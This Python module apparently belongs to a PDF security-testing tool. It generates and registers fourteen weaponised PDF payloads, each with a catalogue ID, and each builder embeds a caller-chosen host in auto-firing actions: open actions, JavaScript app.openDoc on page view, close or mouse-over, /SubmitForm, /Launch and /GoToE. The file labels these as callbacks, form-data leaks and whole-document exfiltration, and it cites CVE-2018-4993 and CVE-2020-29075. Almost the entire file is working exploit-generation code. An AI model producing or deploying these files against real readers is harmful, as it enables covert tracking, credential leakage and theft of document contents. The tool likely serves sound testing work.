from __future__ import annotations

from nonpdf.core.branding import PDF_HEADER_COMMENT
from nonpdf.core.registry import PayloadEntry, registry


# ---- primitives ---------------------------------------------------------

def _minimal_pdf(host: bytes, page_body: bytes, extra_obj: bytes,
                 root_extra: bytes = b"", *, version: str = "1.7") -> bytes:
    """Standard 5-object skeleton reused by most action vectors."""
    head = f"%PDF-{version}\n".encode() + PDF_HEADER_COMMENT
    return (
        head
        + b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R" + root_extra + b" >>\nendobj\n"
        + b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 595 842] >>\nendobj\n"
        + b"3 0 obj\n<< /Type /Page /Parent 2 0 R /Resources << /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Courier >> >> >> /Contents 4 0 R >>\nendobj\n"
        + _content_stream(page_body)
        + b"5 0 obj\n" + extra_obj + b"\nendobj\n"
        + b"trailer\n<< /Root 1 0 R /Size 6 >>\n%%EOF\n"
    )


def _content_stream(label: bytes) -> bytes:
    body = (
        b"stream\nBT /F1 22 Tf 30 800 Td (" + label + b") Tj ET\nendstream"
    )
    return (
        b"4 0 obj\n<< /Length " + str(len(body) - 8).encode() + b" >>\n"
        + body + b"\nendobj\n"
    )


# ---- action vectors -----------------------------------------------------

def build_uri(host: str) -> bytes:
    return _minimal_pdf(
        host.encode(),
        b"Testcase: 'uri'",
        b"<< /Type /Action /S /URI /URI (" + host.encode() + b"/p-uri) >>",
        root_extra=b" /OpenAction 5 0 R",
    )


def build_launch(host: str) -> bytes:
    return _minimal_pdf(
        host.encode(),
        b"Testcase: 'launch'",
        b"<< /Type /Action /S /Launch /F << /Type /FileSpec /F ("
        + host.encode() + b"/p-launch.pdf) /V true /FS /URL >> /NewWindow false >>",
        root_extra=b" /OpenAction 5 0 R",
    )


def build_launch_print(host: str) -> bytes:
    return _minimal_pdf(
        host.encode(),
        b"Testcase: 'launch-print'",
        b"<< /Type /Action /S /Launch /F << /Type /FileSpec /F ("
        + host.encode() + b"/p-launch-print.pdf) /V true /FS /URL >>"
        b" /Win << /O /print >> /NewWindow false >>",
        root_extra=b" /OpenAction 5 0 R",
    )


def build_gotor(host: str) -> bytes:
    return _minimal_pdf(
        host.encode(),
        b"Testcase: 'gotor'",
        b"<< /Type /Action /S /GoToR /F << /Type /FileSpec /F ("
        + host.encode() + b"/p-gotor.pdf) /V true /FS /URL >>"
        b" /NewWindow false /D [0 /Fit] >>",
        root_extra=b" /OpenAction 5 0 R",
    )


def build_gotoe(host: str) -> bytes:
    # /GoToE via page /AA /O — CVE-2018-4993 class
    page = (
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R"
        b" /AA << /O << /F (" + host.encode() + b"/p-gotoe) /D [0 /Fit] /S /GoToE >> >>"
        b" /Resources << /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Helvetica >> >> >> >>"
    )
    head = b"%PDF-1.7\n" + PDF_HEADER_COMMENT
    return (
        head
        + b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        + b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        + b"3 0 obj\n" + page + b"\nendobj\n"
        + b"4 0 obj\n<< /Length 40 >>\nstream\nBT (NonPDF) Tj ET\nendstream\nendobj\n"
        + b"trailer\n<< /Root 1 0 R /Size 5 >>\n%%EOF\n"
    )


def build_submit_html(host: str) -> bytes:
    root = (
        b" /OpenAction 5 0 R"
        b" /AcroForm << /Fields [<< /Type /Annot /Subtype /Widget /FT /Tx"
        b" /T (a) /V (b) /Ff 0 >>] >>"
    )
    return _minimal_pdf(
        host.encode(),
        b"Testcase: 'submit-html'",
        b"<< /Type /Action /S /SubmitForm /F << /Type /FileSpec /F ("
        + host.encode() + b"/p-submit.pdf) /V true /FS /URL >> /Flags 4 >>",
        root_extra=root,
    )


def build_submit_pdf(host: str) -> bytes:
    """Flags 256 = SubmitPDF — exfiltrates the entire document body."""
    root = (
        b" /OpenAction 5 0 R"
        b" /AcroForm << /Fields [<< /Type /Annot /Subtype /Widget /FT /Tx"
        b" /T (a) /V (b) /Ff 0 >>] >>"
    )
    return _minimal_pdf(
        host.encode(),
        b"Testcase: 'submit-pdf'",
        b"<< /Type /Action /S /SubmitForm /F << /Type /FileSpec /F ("
        + host.encode() + b"/p-submit-pdf.pdf) /V true /FS /URL >> /Flags 256 >>",
        root_extra=root,
    )


def build_import_data(host: str) -> bytes:
    root = (
        b" /AcroForm << /Fields [<< /Type /Annot /Subtype /Widget /FT /Tx"
        b" /T (a) /V (b) /Ff 0 >>] >>"
    )
    return _minimal_pdf(
        host.encode(),
        b"Testcase: 'importdata'",
        b"<< /Type /Action /S /ImportData /F << /Type /FileSpec /F ("
        + host.encode() + b"/p-import.pdf) /V true /FS /URL >> >>",
        root_extra=root,
    )


def build_thread(host: str) -> bytes:
    return _minimal_pdf(
        host.encode(),
        b"Testcase: 'thread'",
        b"<< /Type /Action /S /Thread /F << /Type /FileSpec /F ("
        + host.encode() + b"/p-thread.pdf) /V true /FS /URL >> /D 0 >>",
        root_extra=b" /OpenAction 5 0 R",
    )


def build_names_js(host: str) -> bytes:
    root = (
        b" /Names << /JavaScript << /Names [(autorun) 5 0 R] >> >>"
    )
    return _minimal_pdf(
        host.encode(),
        b"Testcase: 'names-js'",
        b"<< /Type /Action /S /JavaScript /JS (app.openDoc({cPath: encodeURI(\""
        + host.encode() + b"/p-names\"), cFS: \"CHTTP\"})) >>",
        root_extra=root,
    )


def build_aa_silent(host: str) -> bytes:
    """/AA /WC + /WS + /DS — silent catalog-level callbacks on close/save."""
    root = (
        b" /AA <<"
        b" /WC << /S /URI /URI (" + host.encode() + b"/p-wc) >>"
        b" /WS << /S /URI /URI (" + host.encode() + b"/p-ws) >>"
        b" /DS << /S /URI /URI (" + host.encode() + b"/p-ds) >>"
        b" >>"
    )
    return _minimal_pdf(
        host.encode(), b"Testcase: 'aa-silent'",
        b"<< /Type /Action /S /URI /URI (" + host.encode() + b"/p-unused) >>",
        root_extra=root,
    )


def build_pv_auto(host: str) -> bytes:
    """/AA /PV on Screen annotation fires JS when page becomes visible."""
    page = (
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Contents 4 0 R"
        b" /Annots [<< /Type /Annot /Subtype /Screen /Rect [0 0 900 900]"
        b" /AA << /PV << /S /JavaScript /JS (app.openDoc({cPath: encodeURI(\""
        + host.encode() + b"/p-pv\"), cFS: \"CHTTP\"})) >> >> >>] >>"
    )
    head = b"%PDF-1.7\n" + PDF_HEADER_COMMENT
    return (
        head
        + b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        + b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 595 842] >>\nendobj\n"
        + b"3 0 obj\n" + page + b"\nendobj\n"
        + b"4 0 obj\n<< /Length 40 >>\nstream\nBT (NonPDF) Tj ET\nendstream\nendobj\n"
        + b"trailer\n<< /Root 1 0 R /Size 5 >>\n%%EOF\n"
    )


def build_pc_close(host: str) -> bytes:
    """/AA /PC fires JS on page close."""
    page = (
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Contents 4 0 R"
        b" /Annots [<< /Type /Annot /Subtype /Screen /Rect [0 0 900 900]"
        b" /AA << /PC << /S /JavaScript /JS (app.openDoc({cPath: encodeURI(\""
        + host.encode() + b"/p-pc\"), cFS: \"CHTTP\"})) >> >> >>] >>"
    )
    head = b"%PDF-1.7\n" + PDF_HEADER_COMMENT
    return (
        head
        + b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        + b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 595 842] >>\nendobj\n"
        + b"3 0 obj\n" + page + b"\nendobj\n"
        + b"4 0 obj\n<< /Length 40 >>\nstream\nBT (NonPDF) Tj ET\nendstream\nendobj\n"
        + b"trailer\n<< /Root 1 0 R /Size 5 >>\n%%EOF\n"
    )


def build_mouseover(host: str) -> bytes:
    """/AA /E — mouse-enter fires JS."""
    page = (
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Contents 4 0 R"
        b" /Annots [<< /Type /Annot /Subtype /Link /Rect [0 0 900 900]"
        b" /AA << /E << /S /JavaScript /JS (app.openDoc({cPath: encodeURI(\""
        + host.encode() + b"/p-hover\"), cFS: \"CHTTP\"})) >> >> >>] >>"
    )
    head = b"%PDF-1.7\n" + PDF_HEADER_COMMENT
    return (
        head
        + b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        + b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 595 842] >>\nendobj\n"
        + b"3 0 obj\n" + page + b"\nendobj\n"
        + b"4 0 obj\n<< /Length 40 >>\nstream\nBT (NonPDF) Tj ET\nendstream\nendobj\n"
        + b"trailer\n<< /Root 1 0 R /Size 5 >>\n%%EOF\n"
    )


# ---- registrations ------------------------------------------------------

registry.register(PayloadEntry(
    id="A01", name="uri_action",
    builder=lambda host: build_uri(host),
    description="/URI action open-trigger callback",
    platform="pdfium", tags=("quick", "action"),
))

registry.register(PayloadEntry(
    id="A02", name="launch_url",
    builder=lambda host: build_launch(host),
    description="/Launch action with remote URL FileSpec",
    platform="pdfium", tags=("action",),
))

registry.register(PayloadEntry(
    id="A03", name="launch_print",
    builder=lambda host: build_launch_print(host),
    description="/Launch /Win /O /print forces remote fetch",
    platform="pdfium", tags=("action",),
))

registry.register(PayloadEntry(
    id="A04", name="gotor_remote",
    builder=lambda host: build_gotor(host),
    description="/GoToR remote PDF load",
    platform="pdfium", tags=("action",),
))

registry.register(PayloadEntry(
    id="A05", name="gotoe_unc",
    builder=lambda host: build_gotoe(host),
    description="/GoToE /AA /O — CVE-2018-4993 class",
    platform="acrobat", cve="CVE-2018-4993", tags=("action", "unc"),
))

registry.register(PayloadEntry(
    id="A06", name="submit_html",
    builder=lambda host: build_submit_html(host),
    description="/SubmitForm Flags 4 — form data leak",
    platform="acrobat", tags=("action",),
))

registry.register(PayloadEntry(
    id="A07", name="submit_pdf",
    builder=lambda host: build_submit_pdf(host),
    description="/SubmitForm Flags 256 — exfiltrates entire PDF body",
    platform="acrobat", tags=("action",),
))

registry.register(PayloadEntry(
    id="A08", name="import_data",
    builder=lambda host: build_import_data(host),
    description="/ImportData action pulls remote data",
    platform="acrobat", tags=("action",),
))

registry.register(PayloadEntry(
    id="A09", name="thread_action",
    builder=lambda host: build_thread(host),
    description="/Thread action remote FileSpec fetch",
    platform="acrobat", tags=("action",),
))

registry.register(PayloadEntry(
    id="A10", name="names_js",
    builder=lambda host: build_names_js(host),
    description="/Names /JavaScript catalog-level auto-execute",
    platform="acrobat", tags=("action", "javascript"),
))

registry.register(PayloadEntry(
    id="A11", name="aa_silent",
    builder=lambda host: build_aa_silent(host),
    description="Catalog /AA /WC /WS /DS silent DNS callback",
    platform="acrobat", cve="CVE-2020-29075", tags=("action",),
))

registry.register(PayloadEntry(
    id="A12", name="pv_visible",
    builder=lambda host: build_pv_auto(host),
    description="Screen annot /AA /PV fires JS on visible",
    platform="acrobat", tags=("action", "javascript"),
))

registry.register(PayloadEntry(
    id="A13", name="pc_close",
    builder=lambda host: build_pc_close(host),
    description="Screen annot /AA /PC fires JS on close",
    platform="acrobat", tags=("action", "javascript"),
))

registry.register(PayloadEntry(
    id="A14", name="mouseover",
    builder=lambda host: build_mouseover(host),
    description="Link annot /AA /E mouse-enter fires JS",
    platform="pdfium", tags=("action", "javascript"),
))
